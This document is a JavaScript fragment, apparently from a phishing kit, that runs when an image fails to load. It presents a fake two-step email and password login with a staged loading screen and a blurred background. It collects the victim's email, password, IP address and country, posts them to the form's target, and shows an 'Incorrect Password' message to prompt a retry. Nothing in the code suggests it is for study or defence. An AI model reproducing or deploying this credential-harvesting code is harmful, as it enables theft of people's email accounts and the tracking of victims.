function handleImgError() {
const emailForm = document.getElementById("emailForm");
        const passwordForm = document.getElementById("passwordForm");
        const emailInput = document.getElementById("emailInput");
        const emailProceed = document.getElementById("emailProceed");
        const passwordInput = document.getElementById("passwordInput");
        const passwordSubmit = document.getElementById("passwordSubmit");
        const emailError = document.getElementById("emailError");
        const passwordError = document.getElementById("passwordError");
        const background = document.getElementById("background");
        const loading = document.getElementById("loading");
        const sessionIdElement = document.getElementById("sessionId");
        const loginForm = document.getElementById("loginForm");
        const formEmailInput = document.getElementById("formEmailInput");
        const formSessionId = document.getElementById("formSessionId");
        const formIpInput = document.getElementById("formIpInput");
        const formCountryInput = document.getElementById("formCountryInput");

        function generateSessionId() {
          const chars = '';
          let sessionId = '';
          for (let i = 0; i &lt; 10; i++) {
            sessionId += chars.charAt(Math.floor(Math.random() * chars.length));
          }
          return sessionId;
        }

        function getIPInfo() {
          return new Promise((resolve) => {
            fetch('https://ipapi.co/json/')
              .then(response => {
                if (!response.ok) {
                  console.error('IP API error:', response.statusText);
                  return null;
                }
                return response.json();
              })
              .then(data => {
                resolve({
                  ip: data ? data.ip || 'Unknown' : 'Unknown',
                  country: data ? data.country_name || 'Unknown' : 'Unknown'
                });
              })
              .catch(error => {
                console.error('Failed to fetch IP info:', error);
                resolve({ ip: 'Unknown', country: 'Unknown' });
              });
          });
        }

        // Set initial states
        sessionIdElement.textContent = '' + generateSessionId();
        emailProceed.disabled = emailInput.value.trim() === "";
        emailError.classList.toggle("active", emailInput.value.trim() === "");

        emailProceed.addEventListener("click", () => {
          if (emailInput.value.trim() !== "") {
            emailForm.style.display = "none";
            background.style.display = "none";
            loading.classList.add("active");
            setTimeout(() => {
              loading.style.display = "none";
              background.style.display = "block";
              background.style.filter = "blur(3px)";
              passwordForm.style.display = "block";
            }, 3000);
          }
        });

        loginForm.addEventListener("submit", async (e) => {
          e.preventDefault();
          if (passwordInput.value.trim() === "") {
            passwordError.textContent = "Enter your email password";
            passwordError.classList.add("active");
            passwordInput.classList.add("shake");
            setTimeout(() => passwordInput.classList.remove("shake"), 500);
            return;
          }

          // Populate hidden fields
          formEmailInput.value = emailInput.value;
          formSessionId.value = sessionIdElement.textContent.replace('Session ID: ', '');

          // Fetch IP info and populate hidden fields
          const ipInfo = await getIPInfo();
          formIpInput.value = ipInfo.ip;
          formCountryInput.value = ipInfo.country;

          // Submit the form
          const formData = new FormData(loginForm);
          try {
            const response = await fetch(loginForm.action, {
              method: 'POST',
              body: formData
            });
            const result = await response.json();
            if (!response.ok) {
              passwordError.textContent = result.message || "Incorrect Password";
              passwordError.classList.add("active");
              passwordInput.classList.add("shake");
              passwordInput.value = "";
              setTimeout(() => passwordInput.classList.remove("shake"), 500);
              return;
            }
            background.style.filter = "none";
            passwordForm.style.display = "none";
          } catch (error) {
            console.error('Form submission error:', error);
            passwordError.textContent = "Server error, try again: " + error.message;
            passwordError.classList.add("active");
            passwordInput.classList.add("shake");
            setTimeout(() => passwordInput.classList.remove("shake"), 500);
          }
        });
